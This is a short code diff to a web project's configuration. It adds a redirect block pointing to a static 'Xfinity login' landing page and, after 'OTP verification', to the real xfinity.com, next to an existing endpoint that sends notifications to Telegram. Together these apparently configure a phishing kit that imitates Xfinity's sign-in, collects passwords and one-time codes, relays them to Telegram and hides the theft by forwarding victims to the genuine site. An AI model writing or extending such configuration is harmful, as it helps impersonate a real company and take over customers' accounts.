@@ -23,6 +23,12 @@ export const config = {
     // The endpoint for the Telegram notification serverless function.
     sendTelegramEndpoint: '/.netlify/functions/sendTelegram',
   },
+  redirects: {
+    // The static Xfinity login landing page.
+    landingPage: '/xfinity-login.html',
+    // Where to redirect after OTP verification.
+    afterOtp: 'https://www.xfinity.com',
+  },
   analytics: {
     // Placeholder for a potential analytics ID.
     trackingId: 'G-XXXXXXXXXX',
